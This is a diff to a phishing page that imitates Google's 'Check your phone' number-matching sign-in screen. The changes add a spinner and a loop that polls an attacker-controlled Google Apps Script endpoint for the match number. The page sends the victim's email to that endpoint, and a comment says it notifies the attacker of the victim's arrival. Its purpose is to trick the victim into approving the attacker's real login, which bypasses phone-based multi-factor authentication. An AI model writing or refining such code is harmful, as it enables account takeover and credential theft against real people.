@@ -9,7 +9,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css" />
   <style>
-    .prompt-container { text-align: center; margin: 32px 0; }
+    .prompt-container { text-align: center; margin: 32px 0; display: none; } /* hidden until number ready */
     .match-number {
       font-size: 120px;
       font-weight: bold;
@@ -24,6 +24,17 @@
       box-shadow: 0 4px 12px rgba(0,0,0,0.15);
       user-select: none;
     }
+    .waiting-container { text-align: center; margin: 60px 0; font-size: 18px; color: #5f6368; }
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #1a73e8;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .description { color: #5f6368; font-size: 15px; line-height: 1.5; max-width: 380px; margin: 0 auto; }
   </style>
 </head>
@@ -32,7 +43,6 @@
     <div class="card">
       <div class="logo">
         <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-          <!-- same logo paths as above -->
           <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
           <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
           <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
@@ -49,15 +59,22 @@
       </div>
 
       <h1>Check your phone</h1>
-      <p class="subtitle">Tap <strong>Yes</strong> on the Google prompt on your phone</p>
 
-      <div class="prompt-container">
-        <div class="description">Then select the number shown on this screen:</div>
-        <div class="match-number" id="matchNumber">Waiting...</div>
+      <!-- Waiting state - visible at first -->
+      <div class="waiting-container" id="waiting">
+        <div class="spinner"></div>
+        <p>Preparing verification... Please wait a moment.</p>
+        <p style="font-size:14px; margin-top:16px;">This may take a few seconds while we confirm your device.</p>
       </div>
 
-      <div class="description">
-        This extra step helps make sure it's really you trying to sign in.
+      <!-- Real prompt - hidden until number is set -->
+      <div class="prompt-container" id="prompt">
+        <p class="subtitle">Tap <strong>Yes</strong> on the Google prompt on your phone</p>
+        <div class="description">Then select the number shown on this screen:</div>
+        <div class="match-number" id="matchNumber">••</div>
+        <div class="description" style="margin-top:32px;">
+          This extra step helps make sure it's really you trying to sign in.
+        </div>
       </div>
 
       <div class="actions" style="text-align:right; margin-top:40px;">
@@ -78,8 +95,9 @@
     const initial = usernamePart.charAt(0).toUpperCase();
     document.getElementById("avatar").textContent = initial;
 
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyDInjLh0KSXEDGbbrXGcXvibhz84wz2Sva6FS90o5EdHe4wKcf2kuou0Oy2Kdj8lII/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxxwtqSxcM3xKDVY4vaXQ1E44cosqIVI9HM0guLL8GHe2hEV3S9EmQ1Pr46jzWZa9zS/exec";
 
+    // Notify attacker that victim arrived (same as before)
     fetch(SCRIPT_URL, {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -91,24 +109,41 @@
       })
     }).catch(() => {});
 
-    function checkForNumber() {
-      fetch(`${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}`)
-        .then(r => r.json())
-        .then(data => {
-          if (data && data.prompt_number) {
+    // Polling function
+    let pollInterval;
+    function startPolling() {
+      pollInterval = setInterval(async () => {
+        try {
+          const res = await fetch(`${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}`);
+          const data = await res.json();
+
+          if (data && data.prompt_number && data.prompt_number.trim() !== "") {
+            // Number is set → show real prompt
+            document.getElementById("waiting").style.display = "none";
+            document.getElementById("prompt").style.display = "block";
             document.getElementById("matchNumber").textContent = data.prompt_number;
+
+            // Optional: stop polling or slow it down
+            clearInterval(pollInterval);
+            // Or keep polling slowly if you want updates later: setInterval(..., 30000);
           }
-        })
-        .catch(() => {});
+          // else → keep waiting (spinner stays visible)
+        } catch (err) {
+          console.error("Poll error:", err);
+          // Keep trying
+        }
+      }, 3000); // Poll every 3 seconds (adjust if needed: 2000–5000 ms)
     }
 
-    setInterval(checkForNumber, 4000);
-    checkForNumber();
+    // Start polling immediately after page load
+    startPolling();
 
+    // Fallback: auto-redirect after very long time (e.g. 5 minutes)
     setTimeout(() => {
+      clearInterval(pollInterval);
       localStorage.removeItem("demoEmail");
       window.location.href = "https://mail.google.com/";
-    }, 180000);
+    }, 300000);
   </script>
 </body>
 </html>
